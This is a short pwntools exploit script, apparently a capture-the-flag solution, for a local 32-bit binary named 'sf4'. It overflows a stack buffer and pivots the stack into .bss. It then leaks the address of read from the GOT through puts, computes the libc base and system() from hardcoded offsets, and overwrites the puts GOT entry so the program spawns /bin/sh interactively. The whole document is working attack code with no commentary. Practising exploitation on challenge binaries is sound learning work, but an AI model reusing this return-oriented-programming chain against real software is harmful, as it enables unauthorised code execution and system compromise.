from pwn import *

p = process("./sf4")

read_got = 0x804a00c
read_plt = 0x8048370

puts_got = 0x804a010
puts_plt = 0x8048380

read_leave_return = 0x080484c4
leave_return = 0x080484d5

pr = 0x08048359
# ppr = 0x0804859a
pppr = 0x08048599
 
bss = 0x0804a040 + 0x400 
binsh = 0x804a014



pay = b''
pay += b'A'*0x28
pay += p32(bss + 0x28)
pay += p32(read_leave_return) 
p.send(pay)


pay = b''
pay += p32(bss + 0x128)
pay += p32(puts_plt)
pay += p32(pr) 
pay += p32(read_got)
pay += p32(read_leave_return)
pay += b"B" * (0x28 - len(pay)) 
pay += p32(bss)
pay += p32(leave_return)
p.send(pay)

p.recvline()
libc_read = u32(p.recv(4))
libc_base = libc_read - 0xd5c20
libc_sys = libc_base + 0x3adb0

print(hex(libc_sys))
input("stop")

pay = b""
pay += b"XXXX"
pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(puts_got)
pay += p32(0x100)

pay += p32(puts_plt)
pay += b"XXXX"
pay += p32(binsh)
pay += b'B' * (0x28 - len(pay))
pay += p32(bss + 0x100)
pay += p32(leave_return)
p.send(pay) 

pay = b''
pay += p32(libc_sys)
pay += b"/bin/sh\x00"
p.send(pay)

p.interactive()


